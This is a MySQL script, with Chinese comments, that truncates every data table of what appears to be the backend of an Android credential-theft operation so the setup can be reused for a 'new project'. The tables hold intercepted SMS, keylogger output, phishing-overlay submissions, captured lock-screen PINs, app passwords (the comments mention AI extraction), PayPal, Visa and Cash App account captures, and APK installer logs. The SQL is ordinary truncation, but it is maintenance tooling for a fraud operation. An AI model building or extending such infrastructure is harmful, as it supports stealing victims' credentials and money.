-- =============================================================================
-- 新项目：清理业务数据（保留表结构）
-- 用法：
--   Navicat：先选中目标库，再整段执行本文件（不要写死库名）
--   命令行：mysql -u... -p... <库名> < sql/clean-for-new-project.sql
--
-- 注意：
--   1. 不可逆，执行前先 mysqldump 备份
--   2. 建议先停 Manage API / 踢掉在线设备 WS
--   3. 表不存在会自动跳过（兼容未跑全迁移的环境）
--   4. app_config 清空后会写回支付方式默认值；AI 配置不写回（需后台重新填写）
--   5. 内部用 DATABASE() 识别当前库，务必先选对库再执行
-- =============================================================================

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- 仅当表存在时 TRUNCATE
DROP PROCEDURE IF EXISTS sp_truncate_if_exists;
DELIMITER $$
CREATE PROCEDURE sp_truncate_if_exists(IN p_table VARCHAR(64))
BEGIN
  IF EXISTS (
    SELECT 1
    FROM information_schema.tables
    WHERE table_schema = DATABASE()
      AND table_name = p_table
  ) THEN
    SET @sql = CONCAT('TRUNCATE TABLE `', p_table, '`');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
  END IF;
END$$
DELIMITER ;

-- ---------- 设备侧采集 / 命令 ----------
CALL sp_truncate_if_exists('commands');
CALL sp_truncate_if_exists('sms_logs');
CALL sp_truncate_if_exists('keyboard_logs');
CALL sp_truncate_if_exists('fake_page_submissions');
CALL sp_truncate_if_exists('device_keyguard_pin_history');
CALL sp_truncate_if_exists('device_keyguard_pins');
CALL sp_truncate_if_exists('device_installed_apps');

-- ---------- 应用账号 / 密码（AI 提取或手工，按设备+包名） ----------
CALL sp_truncate_if_exists('device_app_accounts');
CALL sp_truncate_if_exists('device_app_passwords');
CALL sp_truncate_if_exists('fake_page_web_links');

-- ---------- 全局金融应用标记 ----------
CALL sp_truncate_if_exists('finance_app_packages');

-- ---------- 支付账号采集 ----------
CALL sp_truncate_if_exists('device_paypal_accounts');
CALL sp_truncate_if_exists('device_visa_accounts');
CALL sp_truncate_if_exists('device_cashapp_accounts');
CALL sp_truncate_if_exists('device_debit_accounts');

-- ---------- 安装 / 下载 / 落地页 / 视频 ----------
CALL sp_truncate_if_exists('apk_download_logs');
CALL sp_truncate_if_exists('installer_install_logs');
CALL sp_truncate_if_exists('client_install_logs');
CALL sp_truncate_if_exists('landing_page_views');
CALL sp_truncate_if_exists('massage_videos');

-- ---------- 设备分组（先于 devices） ----------
CALL sp_truncate_if_exists('device_groups');

-- ---------- 设备主表（最后清） ----------
CALL sp_truncate_if_exists('devices');

-- ---------- 系统配置：清空后写回支付默认；AI 配置需重新在后台填写 ----------
CALL sp_truncate_if_exists('app_config');

INSERT INTO app_config (config_key, config_value)
SELECT 'a_payment_methods', '["paypal","visa"]'
FROM DUAL
WHERE EXISTS (
  SELECT 1
  FROM information_schema.tables
  WHERE table_schema = DATABASE()
    AND table_name = 'app_config'
)
ON DUPLICATE KEY UPDATE config_value = VALUES(config_value);

DROP PROCEDURE IF EXISTS sp_truncate_if_exists;

SET FOREIGN_KEY_CHECKS = 1;

SELECT 'clean_done' AS status, DATABASE() AS db_name, NOW() AS finished_at;
